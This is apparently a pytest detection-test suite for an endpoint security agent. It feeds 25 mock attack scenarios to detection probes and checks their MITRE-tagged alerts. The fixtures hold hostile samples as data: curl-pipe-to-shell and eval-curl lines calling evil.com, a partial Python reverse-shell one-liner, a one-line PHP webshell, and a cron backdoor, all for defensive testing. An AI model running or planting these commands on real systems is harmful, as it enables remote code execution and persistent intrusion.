"""25-Scenario Attack Surface Validation Suite.

Maps to attack surface coverage for all 8 agents. Originally 12 scenarios
(docs/eoa/mac_entry_surface_coverage_matrix.md), extended to 25 to cover
newly-unblocked probes from sensor upgrades (FSEvents, nettop, OpenBSM).

Each test injects mock data through the probe's expected interface
(shared_data, psutil mock, etc.) and verifies the probe fires with
correct event_type, severity, and MITRE techniques.

Coverage:
    Surface 1-3: Execution (ProcAgent)
    Surface 4-6: Persistence (PersistenceGuard)
    Surface 7-8: Filesystem (FIMAgent)
    Surface 9-10: DNS (DNSAgent)
    Surface 11: Peripheral (PeripheralAgent)
    Surface 12: Auth (AuthGuard)
    Surface 13-14: Filesystem advanced (FIM — SUID, Config backdoor)
    Surface 15-16: Persistence advanced (SSH key, Hidden file)
    Surface 17-20: Network flow (Port scan, Exfil, C2 beacon, Tunnel)
    Surface 21-22: DNS advanced (Suspicious TLD, DNS tunneling)
    Surface 23: Auth brute force (AuthGuard)
    Surface 24-25: Kernel audit (Execve from /tmp, Syscall flood)
"""

from __future__ import annotations

import stat
import time
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch

import psutil as real_psutil
import pytest

from amoskys.agents.common.probes import ProbeContext, Severity

# ============================================================================
# HELPERS
# ============================================================================


def _ctx(device_id: str = "test-host", agent_name: str = "test-agent", **shared):
    """Build a ProbeContext with shared_data."""
    return ProbeContext(
        device_id=device_id,
        agent_name=agent_name,
        shared_data=shared,
    )


def _now_ns() -> int:
    return int(time.time() * 1e9)


# ============================================================================
# SCENARIO 1 — Binary executed from /tmp  (ProcAgent → binary_from_temp)
# ============================================================================


class TestScenario01_BinaryFromTemp:
    """An attacker drops a binary in /tmp and executes it."""

    def test_binary_from_tmp_fires(self):
        from amoskys.agents.proc.probes import BinaryFromTempProbe

        probe = BinaryFromTempProbe()
        context = _ctx(agent_name="proc")

        mock_proc = MagicMock()
        mock_proc.info = {
            "pid": 7777,
            "name": "payload",
            "exe": "/tmp/payload",
            "cmdline": ["/tmp/payload", "--connect"],
            "username": "attacker",
            "create_time": 1700000000.0,
        }

        with (
            patch("amoskys.agents.proc.probes.psutil") as mp,
            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
        ):
            mp.process_iter.return_value = [mock_proc]
            mp.NoSuchProcess = real_psutil.NoSuchProcess
            mp.AccessDenied = real_psutil.AccessDenied
            events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "execution_from_temp"
        assert ev.severity == Severity.HIGH
        assert "T1204" in ev.mitre_techniques
        assert ev.data["exe"] == "/tmp/payload"
        assert "process_guid" in ev.data


# ============================================================================
# SCENARIO 2 — curl | sh pattern  (ProcAgent → lolbin_execution)
# ============================================================================


class TestScenario02_CurlPipeShell:
    """Attacker runs 'curl http://evil.com/payload.sh | sh'."""

    def test_lolbin_curl_with_suspicious_cmdline(self):
        from amoskys.agents.proc.probes import LOLBinExecutionProbe

        probe = LOLBinExecutionProbe()
        context = _ctx(agent_name="proc")

        mock_proc = MagicMock()
        mock_proc.info = {
            "pid": 8001,
            "name": "curl",
            "exe": "/usr/bin/curl",
            "cmdline": ["curl", "-s", "http://evil.com/payload.sh"],
            "username": "attacker",
            "ppid": 1,
            "create_time": 1700000000.0,
        }

        with (
            patch("amoskys.agents.proc.probes.psutil") as mp,
            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
        ):
            mp.process_iter.return_value = [mock_proc]
            mp.NoSuchProcess = real_psutil.NoSuchProcess
            mp.AccessDenied = real_psutil.AccessDenied
            events = probe.scan(context)

        # curl is a known LOLBin — should fire
        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "lolbin_execution"
        assert "T1218" in ev.mitre_techniques
        assert ev.data["binary"] == "curl"
        assert "process_guid" in ev.data


# ============================================================================
# SCENARIO 3 — Python reverse shell  (ProcAgent → script_interpreter)
# ============================================================================


class TestScenario03_PythonReverseShell:
    """Attacker spawns: python3 -c 'import socket,subprocess,os; ...'"""

    def test_script_interpreter_detects_reverse_shell(self):
        from amoskys.agents.proc.probes import ScriptInterpreterProbe

        probe = ScriptInterpreterProbe()
        context = _ctx(agent_name="proc")

        mock_proc = MagicMock()
        mock_proc.info = {
            "pid": 9001,
            "name": "python3",
            "cmdline": [
                "python3",
                "-c",
                "import socket,subprocess,os; s=socket.socket(); s.connect(('10.0.0.1',4444))",
            ],
            "username": "attacker",
            "create_time": 1700000000.0,
        }

        with (
            patch("amoskys.agents.proc.probes.psutil") as mp,
            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
        ):
            mp.process_iter.return_value = [mock_proc]
            mp.NoSuchProcess = real_psutil.NoSuchProcess
            mp.AccessDenied = real_psutil.AccessDenied
            events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "suspicious_script_execution"
        assert ev.severity == Severity.HIGH
        assert "T1059" in ev.mitre_techniques
        assert ev.data["interpreter"] == "python3"
        assert "process_guid" in ev.data


# ============================================================================
# SCENARIO 4 — LaunchAgent plist created  (PersistenceGuard → launchd)
# ============================================================================


class TestScenario04_LaunchAgentPersistence:
    """Attacker creates a malicious LaunchAgent plist."""

    def test_launchd_persistence_created(self):
        from amoskys.agents.persistence.probes import (
            LaunchAgentDaemonProbe,
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
        )

        probe = LaunchAgentDaemonProbe()
        now = _now_ns()

        evil_entry = PersistenceEntry(
            id="com.evil.backdoor",
            mechanism_type="LAUNCH_AGENT",
            user="alice",
            path="/Users/alice/Library/LaunchAgents/com.evil.backdoor.plist",
            command="/bin/bash",
            args="-c curl http://evil.com/payload | sh",
            enabled=True,
            hash="a" * 64,
            metadata={},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="com.evil.backdoor",
            mechanism_type="LAUNCH_AGENT",
            change_type=PersistenceChangeType.CREATED,
            old_entry=None,
            new_entry=evil_entry,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert (
            "launchd" in ev.event_type.lower() or "persistence" in ev.event_type.lower()
        )
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert any("T1543" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 5 — Malicious zshrc modification  (PersistenceGuard → shell_profile)
# ============================================================================


class TestScenario05_ShellProfileHijack:
    """Attacker appends 'eval $(curl evil.com/c2)' to .zshrc."""

    def test_shell_profile_hijack_fires(self):
        from amoskys.agents.persistence.probes import (
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
            ShellProfileHijackProbe,
        )

        probe = ShellProfileHijackProbe()
        now = _now_ns()

        old_entry = PersistenceEntry(
            id="/Users/alice/.zshrc",
            mechanism_type="SHELL_PROFILE",
            user="alice",
            path="/Users/alice/.zshrc",
            command="# normal zshrc content",
            args="",
            enabled=True,
            hash="b" * 64,
            metadata={},
            last_seen_ns=now - 1_000_000_000,
        )

        new_entry = PersistenceEntry(
            id="/Users/alice/.zshrc",
            mechanism_type="SHELL_PROFILE",
            user="alice",
            path="/Users/alice/.zshrc",
            command="eval $(curl http://evil.com/c2)",
            args="",
            enabled=True,
            hash="c" * 64,
            metadata={},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="/Users/alice/.zshrc",
            mechanism_type="SHELL_PROFILE",
            change_type=PersistenceChangeType.MODIFIED,
            old_entry=old_entry,
            new_entry=new_entry,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "shell" in ev.event_type.lower() or "profile" in ev.event_type.lower()
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert any("T1546" in t or "T1037" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 6 — New cron entry  (PersistenceGuard → cron_persistence)
# ============================================================================


class TestScenario06_CronPersistence:
    """Attacker adds @reboot cron entry with reverse shell."""

    def test_cron_persistence_created(self):
        from amoskys.agents.persistence.probes import (
            CronJobPersistenceProbe,
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
        )

        probe = CronJobPersistenceProbe()
        now = _now_ns()

        cron_entry = PersistenceEntry(
            id="cron:alice:@reboot /tmp/backdoor",
            mechanism_type="CRON_JOB",
            user="alice",
            path="/var/spool/cron/crontabs/alice",
            command="/tmp/backdoor",
            args="@reboot /tmp/backdoor",
            enabled=True,
            hash="d" * 64,
            metadata={"schedule": "@reboot"},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="cron:alice:@reboot /tmp/backdoor",
            mechanism_type="CRON_JOB",
            change_type=PersistenceChangeType.CREATED,
            old_entry=None,
            new_entry=cron_entry,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "cron" in ev.event_type.lower()
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert any("T1053" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 7 — Webshell dropped in web root  (FIMAgent → webshell_drop)
# ============================================================================


class TestScenario07_WebshellDrop:
    """Attacker drops a PHP webshell in /var/www/html/."""

    def test_webshell_detected(self, tmp_path):
        from amoskys.agents.fim.probes import (
            ChangeType,
            FileChange,
            FileState,
            WebShellDropProbe,
        )

        # Create temp webshell file for content scanning
        webshell = tmp_path / "cmd.php"
        webshell.write_bytes(b"<?php system($_REQUEST['cmd']); ?>")

        probe = WebShellDropProbe()

        new_state = FileState(
            path=str(webshell),
            sha256="e" * 64,
            size=34,
            mode=0o100644,
            uid=0,
            gid=0,
            mtime_ns=_now_ns(),
            is_dir=False,
            is_symlink=False,
        )

        change = FileChange(
            path="/var/www/html/cmd.php",  # Must be in WEB_ROOTS
            change_type=ChangeType.CREATED,
            old_state=None,
            new_state=new_state,
            timestamp_ns=_now_ns(),
        )

        context = _ctx(agent_name="fim", file_changes=[change])

        # Patch _check_webshell_patterns to use our temp file path
        with patch.object(probe, "_check_webshell_patterns") as mock_check:
            mock_check.return_value = (True, ["system($_REQUEST)"])
            events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "webshell_detected"
        assert ev.severity == Severity.CRITICAL
        assert "T1505.003" in ev.mitre_techniques


# ============================================================================
# SCENARIO 8 — chmod 777 on /etc/passwd  (FIMAgent → world_writable_sensitive)
# ============================================================================


class TestScenario08_WorldWritable:
    """Attacker runs 'chmod 777 /etc/passwd'."""

    def test_world_writable_sensitive_fires(self):
        from amoskys.agents.fim.probes import (
            ChangeType,
            FileChange,
            FileState,
            WorldWritableSensitiveProbe,
        )

        probe = WorldWritableSensitiveProbe()

        old_state = FileState(
            path="/etc/passwd",
            sha256="f" * 64,
            size=2048,
            mode=stat.S_IFREG | 0o644,  # rw-r--r--
            uid=0,
            gid=0,
            mtime_ns=_now_ns() - 1_000_000_000,
            is_dir=False,
            is_symlink=False,
        )

        new_state = FileState(
            path="/etc/passwd",
            sha256="f" * 64,
            size=2048,
            mode=stat.S_IFREG | 0o777,  # rwxrwxrwx (world-writable!)
            uid=0,
            gid=0,
            mtime_ns=_now_ns(),
            is_dir=False,
            is_symlink=False,
        )

        change = FileChange(
            path="/etc/passwd",
            change_type=ChangeType.PERM_CHANGED,
            old_state=old_state,
            new_state=new_state,
            timestamp_ns=_now_ns(),
        )

        context = _ctx(agent_name="fim", file_changes=[change])
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "world_writable_sensitive"
        assert ev.severity == Severity.HIGH
        assert "T1565" in ev.mitre_techniques


# ============================================================================
# SCENARIO 9 — NXDOMAIN burst  (DNSAgent → nxdomain_burst)
# ============================================================================


class TestScenario09_NXDomainBurst:
    """Malware probes 50 random subdomains → all return NXDOMAIN."""

    def test_nxdomain_burst_fires(self):
        from amoskys.agents.dns.probes import DNSQuery, NXDomainBurstProbe

        probe = NXDomainBurstProbe()
        now = datetime.now(timezone.utc)

        # Generate 50 NXDOMAIN queries in rapid succession
        queries = [
            DNSQuery(
                timestamp=now,
                domain=f"xkq{i:03d}rand.evil-c2.com",
                query_type="A",
                response_code="NXDOMAIN",
                process_name="malware",
                process_pid=6666,
            )
            for i in range(50)
        ]

        context = _ctx(agent_name="dns", dns_queries=queries)
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "nxdomain" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)


# ============================================================================
# SCENARIO 10 — High-entropy DGA domains  (DNSAgent → dga_score)
# ============================================================================


class TestScenario10_DGADomains:
    """Malware resolves DGA-generated domains with high entropy."""

    def test_dga_score_fires(self):
        from amoskys.agents.dns.probes import DGAScoreProbe, DNSQuery

        probe = DGAScoreProbe()
        now = datetime.now(timezone.utc)

        # Classic DGA pattern: random consonants, no vowels, high entropy
        dga_domains = [
            "xkrn7f9q2bpthz.com",
            "qjzwxnm5vc8kd.net",
            "plkrhbgfmzxcn.org",
        ]

        queries = [
            DNSQuery(
                timestamp=now,
                domain=domain,
                query_type="A",
                response_code="NOERROR",
                process_name="svchost",
                process_pid=1234,
            )
            for domain in dga_domains
        ]

        context = _ctx(agent_name="dns", dns_queries=queries)
        events = probe.scan(context)

        # At least one DGA domain should be flagged
        assert len(events) >= 1
        ev = events[0]
        assert "dga" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1568" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 11 — USB storage inserted  (PeripheralAgent → usb_storage)
# ============================================================================


class TestScenario11_USBStorage:
    """Attacker inserts a USB flash drive."""

    def test_usb_storage_detected(self):
        from amoskys.agents.peripheral.probes import USBDevice, USBStorageProbe

        probe = USBStorageProbe()

        flash_drive = USBDevice(
            device_id="usb-sandisk-cruzer-001",
            name="SanDisk Cruzer Glide 64GB",
            vendor_id="0x0781",
            product_id="0x5567",
            serial_number="ABC123456",
            manufacturer="SanDisk",
            location_id="0x14100000",
            device_speed="USB 3.0",
            device_class="08",  # Mass Storage
        )

        context = _ctx(
            agent_name="peripheral",
            usb_devices=[flash_drive],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "storage" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1091" in t or "T1052" in t for t in ev.mitre_techniques)
        assert ev.data["name"] == "SanDisk Cruzer Glide 64GB"


# ============================================================================
# SCENARIO 12 — sudo elevation  (AuthGuard → sudo_elevation)
# ============================================================================


class TestScenario12_SudoElevation:
    """User runs 'sudo ls' — first-time sudo for this user."""

    def test_sudo_elevation_first_use(self):
        from amoskys.agents.auth.probes import AuthEvent, SudoElevationProbe

        probe = SudoElevationProbe()
        now = _now_ns()

        auth_events = [
            AuthEvent(
                timestamp_ns=now,
                event_type="SUDO_EXEC",
                status="SUCCESS",
                username="alice",
                command="ls",
                tty="ttys001",
            ),
        ]

        context = _ctx(
            agent_name="auth_guard",
            auth_events=auth_events,
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "sudo" in ev.event_type.lower()
        assert ev.severity in (Severity.LOW, Severity.MEDIUM, Severity.HIGH)
        assert any("T1548" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 13 — SUID bit added  (FIMAgent → suid_bit_change)
# ============================================================================


class TestScenario13_SUIDbitChange:
    """Attacker sets SUID bit on a binary for privilege escalation."""

    def test_suid_bit_fires(self):
        from amoskys.agents.fim.probes import (
            ChangeType,
            FileChange,
            FileState,
            SUIDBitChangeProbe,
        )

        probe = SUIDBitChangeProbe()

        old_state = FileState(
            path="/usr/bin/find",
            sha256="a" * 64,
            size=4096,
            mode=stat.S_IFREG | 0o755,  # No SUID
            uid=0,
            gid=0,
            mtime_ns=_now_ns() - 1_000_000_000,
            is_dir=False,
            is_symlink=False,
        )

        new_state = FileState(
            path="/usr/bin/find",
            sha256="a" * 64,
            size=4096,
            mode=stat.S_IFREG | 0o4755,  # SUID set!
            uid=0,
            gid=0,
            mtime_ns=_now_ns(),
            is_dir=False,
            is_symlink=False,
        )

        change = FileChange(
            path="/tmp/backdoor",
            change_type=ChangeType.PERM_CHANGED,
            old_state=old_state,
            new_state=new_state,
            timestamp_ns=_now_ns(),
        )

        context = _ctx(agent_name="fim", file_changes=[change])
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "suid_bit_added"
        assert ev.severity == Severity.CRITICAL
        assert "T1548.001" in ev.mitre_techniques


# ============================================================================
# SCENARIO 14 — sshd_config backdoor  (FIMAgent → config_backdoor)
# ============================================================================


class TestScenario14_ConfigBackdoor:
    """Attacker modifies sshd_config to enable root login."""

    def test_ssh_config_backdoor_fires(self, tmp_path):
        from amoskys.agents.fim.probes import (
            ChangeType,
            ConfigBackdoorProbe,
            FileChange,
            FileState,
        )

        probe = ConfigBackdoorProbe()

        # Create a temp file with backdoor patterns — probe reads the actual file
        config = tmp_path / "sshd_config"
        config.write_bytes(b"PermitRootLogin yes\nPasswordAuthentication yes\n")

        new_state = FileState(
            path=str(config),
            sha256="b" * 64,
            size=50,
            mode=stat.S_IFREG | 0o644,
            uid=0,
            gid=0,
            mtime_ns=_now_ns(),
            is_dir=False,
            is_symlink=False,
        )

        # Use the temp file path so _check_ssh_config can read it
        change = FileChange(
            path=str(config),  # Actual readable path with "sshd_config" in name
            change_type=ChangeType.MODIFIED,
            old_state=None,
            new_state=new_state,
            timestamp_ns=_now_ns(),
        )

        context = _ctx(agent_name="fim", file_changes=[change])
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "ssh_config_backdoor"
        assert ev.severity == Severity.CRITICAL


# ============================================================================
# SCENARIO 15 — SSH key backdoor  (PersistenceGuard → ssh_key_backdoor)
# ============================================================================


class TestScenario15_SSHKeyBackdoor:
    """Attacker adds unauthorized SSH public key to root's authorized_keys."""

    def test_ssh_key_backdoor_fires(self):
        from amoskys.agents.persistence.probes import (
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
            SSHKeyBackdoorProbe,
        )

        probe = SSHKeyBackdoorProbe()
        now = _now_ns()

        new_key = PersistenceEntry(
            id="ssh:root:AAAAB3NzaC1yc2EAAAA",
            mechanism_type="SSH_AUTHORIZED_KEY",
            user="root",
            path="/root/.ssh/authorized_keys",
            command="ssh-rsa AAAAB3NzaC1yc2EAAAA...",
            args="",
            enabled=True,
            hash="e" * 64,
            metadata={},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="ssh:root:AAAAB3NzaC1yc2EAAAA",
            mechanism_type="SSH_AUTHORIZED_KEY",
            change_type=PersistenceChangeType.CREATED,
            old_entry=None,
            new_entry=new_key,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "ssh" in ev.event_type.lower() and "key" in ev.event_type.lower()
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert "T1098.004" in ev.mitre_techniques


# ============================================================================
# SCENARIO 16 — Hidden executable file  (PersistenceGuard → hidden_file)
# ============================================================================


class TestScenario16_HiddenFile:
    """Attacker drops hidden executable in home directory."""

    def test_hidden_file_persistence_fires(self):
        from amoskys.agents.persistence.probes import (
            HiddenFilePersistenceProbe,
            PersistenceChange,
            PersistenceChangeType,
            PersistenceEntry,
        )

        probe = HiddenFilePersistenceProbe()
        now = _now_ns()

        entry = PersistenceEntry(
            id="/Users/alice/.backdoor",
            mechanism_type="HIDDEN_FILE_PERSISTENCE",
            user="alice",
            path="/Users/alice/.backdoor",
            command="/Users/alice/.backdoor",
            args="",
            enabled=True,
            hash="f" * 64,
            metadata={"is_executable": "true"},
            last_seen_ns=now,
        )

        change = PersistenceChange(
            entry_id="/Users/alice/.backdoor",
            mechanism_type="HIDDEN_FILE_PERSISTENCE",
            change_type=PersistenceChangeType.CREATED,
            old_entry=None,
            new_entry=entry,
            timestamp_ns=now,
        )

        context = _ctx(
            agent_name="persistence",
            persistence_changes=[change],
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "hidden" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1564" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 17 — Vertical port scan  (FlowAgent → port_scan_sweep)
# ============================================================================


class TestScenario17_PortScan:
    """Attacker scans 25 ports on internal target."""

    def test_vertical_port_scan_fires(self):
        from amoskys.agents.flow.probes import FlowEvent, PortScanSweepProbe

        probe = PortScanSweepProbe()
        now = _now_ns()

        flows = [
            FlowEvent(
                src_ip="10.0.0.100",
                dst_ip="10.0.0.200",
                src_port=50000 + i,
                dst_port=i,
                protocol="TCP",
                bytes_tx=64,
                bytes_rx=0,
                packet_count=1,
                first_seen_ns=now + i * 1_000_000,
                last_seen_ns=now + i * 1_000_000,
            )
            for i in range(1, 26)  # 25 ports
        ]

        context = _ctx(agent_name="flow", flows=flows)
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "flow_portscan_vertical"
        assert ev.severity == Severity.HIGH
        assert "T1046" in ev.mitre_techniques


# ============================================================================
# SCENARIO 18 — Data exfiltration 50MB+  (FlowAgent → exfil_volume_spike)
# ============================================================================


class TestScenario18_DataExfil:
    """Attacker exfiltrates 55 MB to external IP."""

    def test_exfil_volume_spike_fires(self):
        from amoskys.agents.flow.probes import DataExfilVolumeSpikeProbe, FlowEvent

        probe = DataExfilVolumeSpikeProbe()
        now = _now_ns()

        flows = [
            FlowEvent(
                src_ip="10.0.0.5",
                dst_ip="203.0.113.99",
                src_port=54321,
                dst_port=443,
                protocol="TCP",
                bytes_tx=55 * 1024 * 1024,  # 55 MB (nettop populated)
                bytes_rx=1024,
                packet_count=1000,
                first_seen_ns=now,
                last_seen_ns=now,
                direction="OUTBOUND",
                pid=5555,
                process_name="exfil_tool",
            )
        ]

        context = _ctx(agent_name="flow", flows=flows)
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "flow_exfil_volume_spike"
        assert ev.severity == Severity.CRITICAL
        assert any("T1041" in t or "T1048" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 19 — C2 beaconing pattern  (FlowAgent → c2_beacon_flow)
# ============================================================================


class TestScenario19_C2Beacon:
    """Malware beacons every 60s with small payloads."""

    def test_c2_beacon_fires(self):
        from amoskys.agents.flow.probes import C2BeaconFlowProbe, FlowEvent

        probe = C2BeaconFlowProbe()
        now = _now_ns()

        # 6 flows at exactly 60s intervals, small bytes
        flows = [
            FlowEvent(
                src_ip="10.0.0.5",
                dst_ip="198.51.100.1",
                src_port=54321,
                dst_port=443,
                protocol="TCP",
                bytes_tx=256,
                bytes_rx=128,
                packet_count=1,
                first_seen_ns=now + i * 60_000_000_000,
                last_seen_ns=now + i * 60_000_000_000,
                direction="OUTBOUND",
                pid=9999,
                process_name="beacon",
            )
            for i in range(6)
        ]

        context = _ctx(agent_name="flow", flows=flows)
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "flow_c2_beaconing_pattern"
        assert ev.severity == Severity.HIGH
        assert any("T1071" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 20 — Suspicious tunnel  (FlowAgent → suspicious_tunnel)
# ============================================================================


class TestScenario20_SuspiciousTunnel:
    """Long-lived SSH tunnel with small packet sizes."""

    def test_suspicious_tunnel_fires(self):
        from amoskys.agents.flow.probes import FlowEvent, SuspiciousTunnelProbe

        probe = SuspiciousTunnelProbe()
        now = _now_ns()

        flows = [
            FlowEvent(
                src_ip="10.0.0.5",
                dst_ip="198.51.100.50",
                src_port=54321,
                dst_port=4444,  # Non-standard
                protocol="TCP",
                bytes_tx=25000,
                bytes_rx=25000,
                packet_count=200,  # avg size = 250 bytes (<500 threshold)
                first_seen_ns=now - 700_000_000_000,  # 700s (>600s threshold)
                last_seen_ns=now,
                direction="OUTBOUND",
                pid=7777,
                process_name="tunnel",
            )
        ]

        context = _ctx(agent_name="flow", flows=flows)
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "flow_suspicious_tunnel_detected"
        assert ev.severity == Severity.HIGH
        assert any("T1090" in t or "T1572" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 21 — Suspicious TLD queries  (DNSAgent → suspicious_tld)
# ============================================================================


class TestScenario21_SuspiciousTLD:
    """Malware queries domains on high-risk TLDs (.xyz, .top, .tk)."""

    def test_suspicious_tld_fires(self):
        from amoskys.agents.dns.probes import DNSQuery, SuspiciousTLDProbe

        probe = SuspiciousTLDProbe()
        now = datetime.now(timezone.utc)

        queries = [
            DNSQuery(
                timestamp=now,
                domain=f"c2-server-{i}.xyz",
                query_type="A",
                response_code="NOERROR",
                process_name="malware",
                process_pid=5555,
            )
            for i in range(3)
        ]

        context = _ctx(agent_name="dns", dns_queries=queries)
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "tld" in ev.event_type.lower()
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1071" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 22 — DNS tunneling via TXT  (DNSAgent → large_txt_tunneling)
# ============================================================================


class TestScenario22_DNSTunneling:
    """Attacker exfiltrates data via encoded TXT record queries."""

    def test_dns_tunneling_fires(self):
        from amoskys.agents.dns.probes import DNSQuery, LargeTXTTunnelingProbe

        probe = LargeTXTTunnelingProbe()
        now = datetime.now(timezone.utc)

        # 6 TXT queries (≥5 threshold) with long subdomain labels
        queries = [
            DNSQuery(
                timestamp=now,
                domain=f"{'a' * 55}.tunnel.evil.com",  # >50 char label
                query_type="TXT",
                response_code="NOERROR",
                process_name="iodine",
                process_pid=3333,
            )
            for i in range(6)
        ]

        context = _ctx(agent_name="dns", dns_queries=queries)
        events = probe.scan(context)

        assert len(events) >= 1
        # Should detect either high TXT volume or tunneling pattern
        event_types = [e.event_type for e in events]
        assert any("txt" in t.lower() or "tunnel" in t.lower() for t in event_types)


# ============================================================================
# SCENARIO 23 — SSH brute force  (AuthGuard → ssh_brute_force)
# ============================================================================


class TestScenario23_SSHBruteForce:
    """Attacker sends 6 failed SSH attempts against 'admin' account."""

    def test_ssh_brute_force_fires(self):
        from datetime import datetime, timezone

        from amoskys.agents.protocol_collectors.agent_types import (
            ProtocolEvent,
            ProtocolType,
        )
        from amoskys.agents.protocol_collectors.probes import SSHBruteForceProbe

        probe = SSHBruteForceProbe()
        now_dt = datetime.now(timezone.utc)

        protocol_events = [
            ProtocolEvent(
                timestamp=now_dt,
                protocol=ProtocolType.SSH,
                src_ip="10.99.99.99",
                dst_ip="192.168.1.1",
                src_port=50000 + i,
                dst_port=22,
                metadata={"auth_result": "failed", "username": "admin"},
            )
            for i in range(6)  # 6 failures (threshold is 5)
        ]

        context = _ctx(
            agent_name="protocol_collectors",
            protocol_events=protocol_events,
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert "brute" in ev.data.get("description", "").lower() or "brute" in ev.event_type.lower()
        assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
        assert any("T1110" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 24 — Execve from /tmp  (KernelAudit → execve_high_risk)
# ============================================================================


class TestScenario24_ExecveFromTmp:
    """Attacker executes dropped binary from /tmp via kernel audit trail."""

    def test_execve_high_risk_fires(self):
        from amoskys.agents.kernel_audit.agent_types import KernelAuditEvent
        from amoskys.agents.kernel_audit.probes import ExecveHighRiskProbe

        probe = ExecveHighRiskProbe()
        now = _now_ns()

        kernel_events = [
            KernelAuditEvent(
                event_id="audit-001",
                timestamp_ns=now,
                host="test-host",
                syscall="execve",
                exe="/tmp/payload",
                pid=7777,
                ppid=1,
                uid=501,
                euid=501,
                cwd="/tmp",
                path="/tmp/payload",
                result="success",
                cmdline="/tmp/payload --connect-back",
                raw={},
            )
        ]

        context = _ctx(
            agent_name="kernel_audit",
            kernel_events=kernel_events,
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "kernel_execve_high_risk"
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1059" in t or "T1204" in t for t in ev.mitre_techniques)


# ============================================================================
# SCENARIO 25 — Kernel syscall flood  (KernelAudit → syscall_flood)
# ============================================================================


class TestScenario25_SyscallFlood:
    """Attacker's tool generates rapid syscall burst."""

    def test_syscall_flood_fires(self):
        from amoskys.agents.kernel_audit.agent_types import KernelAuditEvent
        from amoskys.agents.kernel_audit.probes import SyscallFloodProbe

        probe = SyscallFloodProbe()
        now = _now_ns()

        # 110 syscalls from same PID (threshold is 100)
        kernel_events = [
            KernelAuditEvent(
                event_id=f"audit-{i:04d}",
                timestamp_ns=now + i * 1_000_000,
                host="test-host",
                syscall="open",
                exe="/tmp/scanner",
                pid=6666,
                ppid=1,
                uid=501,
                euid=501,
                cwd="/tmp",
                path=f"/etc/file_{i}",
                result="success",
                raw={},
            )
            for i in range(110)
        ]

        context = _ctx(
            agent_name="kernel_audit",
            kernel_events=kernel_events,
        )
        events = probe.scan(context)

        assert len(events) >= 1
        ev = events[0]
        assert ev.event_type == "kernel_syscall_flood"
        assert ev.severity in (Severity.MEDIUM, Severity.HIGH)
        assert any("T1592" in t or "T1083" in t for t in ev.mitre_techniques)


# ============================================================================
# SUMMARY — Verify all 25 scenarios are present
# ============================================================================


class TestScenarioInventory:
